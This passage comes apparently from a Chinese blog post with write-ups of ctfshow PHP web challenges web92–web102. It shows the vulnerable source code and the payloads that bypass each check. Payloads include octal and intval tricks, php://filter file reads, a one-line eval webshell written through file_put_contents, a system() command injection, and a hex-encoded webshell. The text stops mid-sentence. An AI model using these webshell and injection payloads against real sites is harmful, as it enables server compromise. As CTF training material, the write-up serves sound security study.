class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样匹配到的有三个 bg b\n bs</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">强制从目标字符串开头匹配;</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line">如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本题中由于/m可以匹配到换行符之后的东西，因此构造路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%<span class="number">0</span>aphp</span><br></pre></td></tr></table></figure><p>%0aphp 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。<br>经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag</p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:29:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过源码可以看出我们要让num==4476，但同时也要让intval(num)也为零。<br>intval()是将数据转化为整形，因此可以通过小数来绕过。<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476.1</span></span><br></pre></td></tr></table></figure><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>同上方法一样</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>)</span><br></pre></td></tr></table></figure><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置<br>(该函数中0不能出现在第一个位置上)<br>绕过payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">4476.0</span></span><br></pre></td></tr></table></figure><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><p>科普：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、八进制数是一种逢八进一的计数体制，基数是<span class="number">8</span>，用<span class="number">0</span>~<span class="number">7</span>表示，如<span class="number">077</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、八进制数以数字<span class="number">0</span>开头。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、十六进制数是一种逢十六进一的计数体制，基数是<span class="number">16</span>，用<span class="number">0</span>~<span class="number">9</span>,A~F表示，如<span class="number">0xFF</span>或<span class="number">0XFF</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、十六进制数以数字<span class="number">0</span>和字母x的组合<span class="number">0</span>x或<span class="number">0</span>X开头。其中字母x是不区分大小写的，即<span class="number">0</span>x与<span class="number">0</span>X等价。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题将小数点过滤，使得无法用小数，由于不能用字母，则科学计数法和十六进制都无法使用，因此只能考虑八进制。<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=+<span class="number">010574</span></span><br></pre></td></tr></table></figure><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 19:21:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file() <span class="comment">//该函数可以包含文件,可以加相对路径的文件，也可以用php为协议</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?u=/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">?u=php:<span class="comment">//filter/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 19:36:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看题后要明白本题考察md5（）的比较，我们要知道，md5无法处理数组，但MD5处理数组时会返回为null，因此构造路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=<span class="number">2</span>&amp;b[]=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>看代码发现本题仅仅是让post值覆盖get的值，因此，get方式随便传一个参数，之后POST传参HTTP_FLAG=flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET  ?flag=<span class="number">1</span>  ;POST  HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h2 id="web-99"><a href="#web-99" class="headerlink" title="web 99"></a>web 99</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 22:36:12</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    array_push(<span class="variable">$allow</span>, rand(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据题意可以看出直接创建一个文件，并将一句话木马写入即可。<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get ?n=<span class="number">1</span>.php  POST <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-21 22:10:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据题意，可以发现本题考查and与&amp;&amp;的区别+反射类ReflectionClass的使用<br>（&amp;&amp;&gt;=&gt;and）<br>因此本题会先执行=，and可以不成立。<br>之后是利用PHP中的反射类ReflectionClass，因为已经提示了flag在ctfshow这个类里<a href="https://www.php.net/manual/zh/class.reflectionclass.php">php官网上反射类</a><br>yun师傅举个简单的例子；以供学习。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getConstants());  获取一组常量</span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getName());    获取类名</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getStaticProperties()); 获取静态属性</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getMethods()); 获取类中的方法</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>预期解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><p>本题有非预期解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=system(<span class="string">&quot;cat ctfshow.php&quot;</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br></pre></td></tr></table></figure><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p>同上一题相似，（非预期解消失）</p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-23 20:59:43</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到本题后，发现v2要为全数字，v1应为一个内置类，v3为文件名<br>看到这里我们可以想到16进制绕过is_numeric()。<br>之后便不知道了</p><blockquote><p>call_user_func — 把第一个参数作为回调函数调用<br>1.通过函数的方式回调  2.通过类名、对象的方式回调 3.用call_user_func()来调用一个类里面的方法<br>$s = substr($v2,2) 截取v2中前两个字符</p></blockquote><p>看到大佬博客<br>paylaod<br>首先将我们的一句话编码成16进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=<span class="number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span>&amp;v3=<span class="number">1</span>.php</span><br><span class="line">post:v1=hex2bin</span><br></pre></td></tr></table></figure><p>完成木马的写入。<br>但是本题无法使用，应该是因为环境为php7，因为在php7下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(is_numeric(<span class="string">&quot;0x3c3f706870206576616c28245f504f53545b315d293b3f3e&quot;</span>));  </span><br><span class="line">下返回<span 